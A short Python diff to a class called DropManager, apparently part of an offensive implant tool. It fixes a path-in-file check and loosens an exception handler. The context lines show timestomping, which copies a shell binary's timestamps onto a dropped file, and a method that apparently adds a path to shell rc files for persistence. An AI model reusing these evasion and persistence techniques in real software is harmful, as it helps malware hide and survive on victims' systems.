@@ -255,7 +255,7 @@ class DropManager(object):
                     os.utime(target, (shstat.st_atime, shstat.st_ctime))
                     return target
 
-                except Exception as e:
+                except:
                     continue
 
         for target in targets:
@@ -273,8 +273,11 @@ class DropManager(object):
 
     def _is_path_in_file(self, filepath, path):
         if os.path.isfile(filepath):
-            with open(filepath, 'r') as file:
-                return 'path' in filepath
+            with open(filepath, 'r') as f:
+                for line in f:
+                    if path in line:
+                        return True
+
         return False
 
     def _add_to_rc(self, path):
